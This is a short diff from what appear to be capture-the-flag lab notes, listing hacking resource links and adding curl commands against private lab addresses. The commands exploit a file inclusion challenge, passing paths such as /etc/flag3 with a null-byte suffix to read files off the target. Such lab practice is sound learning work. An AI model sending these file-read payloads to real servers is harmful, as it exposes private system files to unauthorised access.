@@ -7,7 +7,9 @@ https://github.com/topics/osint
 https://github.com/The-Art-of-Hacking/h4cker
 ```
 
-
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.10.177.78/challenges//chall3.php -d "method=POST&file=/etc/flag3%00" --output -
 ---
 curl -X POST http://10.10.188.47/challenges/chall1.php -d "method=GET&file=/etc/flag1"
 
